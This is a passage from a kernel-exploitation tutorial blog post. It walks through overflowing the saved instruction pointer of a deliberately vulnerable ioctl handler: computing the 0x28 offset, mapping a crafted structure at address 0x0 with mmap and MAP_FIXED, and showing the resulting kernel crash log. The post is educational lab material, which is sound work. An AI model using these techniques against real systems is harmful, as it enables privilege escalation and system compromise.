<p>There is no need to comment all the assembly code but you may notice something, the ds:vuln1_ioctl operand in IDA means 0x0 (because the reloc addr of vuln1_ioctl is zero). The compiler hasn&rsquo;t initialized the initial struct pointer (in rsi) to zero but has the opimized the two fields to be directly at the address 0x0(base)+0x0(offset in the struct) for the length and to the address 0x0(base)+0x8(offset of rbuf in the struct, the length field is an unsigned long) for buf (loc_5+3=8). The interesting part is for us only the prologue and the epilogue of the function, firstly it pushs three registers and allocates 0x10 bytes for the local variables, and if we want to be sure to know from which offset rip is overwritten we can look at the epilogue where it will just destroy the previous allocations. So the saved instruction is overwritten from 3 * 8 + 0x10 (three registers plus the space for the local variables) which give us 40 or 0x28. Now that we have this precious information, we need to use mmap to map our structure at 0x0. For this we use the MAP_FIXED argument which permit us to map some pages at a particular virtual address. At 0x0 we begin to craft our structure by putting the length field to 0x28+8 to overflow only the saved instruction pointer. Next we take a pointer toward the bytes which will overflow the saved rip to initialize them to 0x1337 (nice pattern (: ). Now we just have to compile the exploit and launch it, and as seen below we obtain a crash with a nice invalid rip :).</p>
<pre><code>[ 5398.893290] BUG: unable to handle kernel paging request at 0000000000001337
[ 5398.893590] PGD 8000000043111067 P4D 8000000043111067 PUD 4617b067 PMD 43771067 PTE 0
[ 5398.893713] Oops: 0010 [#5] SMP PTI
[ 5398.893818] CPU: 0 PID: 1317 Comm: exploit Tainted: G      D    OE     4.19.0-8-amd64 #1 Debian 4.19.98-1
[ 5398.894229] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
[ 5398.894438] RIP: 0010:0x1337
[ 5398.894662] Code: Bad RIP value.
[ 5398.894933] RSP: 0018:ffffc9000064fed8 EFLAGS: 00010286
[ 5398.895153] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000006
[ 5398.895463] RDX: 0000000000000000 RSI: 0000000000000082 RDI: ffff88804a6166b0
[ 5398.895673] RBP: 0000000000000000 R08: 00000000000005eb R09: 0000000000aaaaaa
[ 5398.896001] R10: 0000000000000000 R11: ffffc9000109f020 R12: 0000000000000000
[ 5398.896187] R13: ffffc9000064ff08 R14: 00007ffd164b6020 R15: 0000000000000000
[ 5398.896395] FS:  00007fc6ae32a500(0000) GS:ffff88804a600000(0000) knlGS:0000000000000000
[ 5398.896599] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 5398.896809] CR2: 000000000000130d CR3: 0000000034140002 CR4: 00000000000206f0
[ 5398.897033] Call Trace:
[ 5398.897261]  ? ksys_write+0x57/0xd0
[ 5398.897512]  ? do_syscall_64+0x53/0x110
[ 5398.897749]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
</code></pre><h1 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>To summarize we&rsquo;ve cover only the basics and we advice you to take a look at the links section. We have only seen how to trigger vulns like buffer overflows, off by one/two, NULL pointer dereferences &hellip; That are very basics vulnerabilities and for more advanced subjects you can look at the articles. If you have questions, please join my discord server or dm me on twitter.</p>
<p>Special thanks to sensei <a href="https://m101.github.io/">@m_101</a> and <a href="http://aassfxxx.infos.st/">@aassfxxx</a> for technical advices and to <a href="https://github.com/medievalghoul">@medievalghoul</a> for reviewing the english !!</p>
<p>~ cheers, nasm</p>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>© linKERN Emporium 2021</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


  <script src="/assets/languageSelector.js"></script>






  
</div>

</body>
</html>
